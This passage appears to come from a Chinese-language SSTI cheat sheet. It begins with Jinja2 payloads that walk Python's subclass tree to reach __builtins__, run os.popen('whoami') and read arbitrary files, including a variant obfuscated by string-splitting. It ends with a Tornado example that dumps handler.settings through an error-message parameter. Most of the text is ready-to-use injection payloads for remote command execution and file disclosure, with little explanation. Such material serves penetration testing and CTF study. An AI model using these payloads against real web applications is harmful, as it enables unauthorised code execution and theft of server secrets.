{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
# 读写文件，通过__builtins__调用open进行文件读写
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```



```python
""['_''_cla''ss_''_']['_''_ba''se_''_']['_''_sub''classes_''_']()[141]['_''_in''it_''_']['_''_glo''bals_''_']['popen']('whoami').read()

```





# Tornado 模板注入 (SSTI)



在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量。


简单理解handler.settings即可，可以把它理解为tornado模板中内置的环境配置信息名称，通过handler.settings可以访问到环境配置的一些信息，看到tornado模板基本上可以通过handler.settings一把梭。

当我们找到注入点时

```
error?msg={{handler.settings}}

```
通过这种方式我们就可以看到环境变量了。
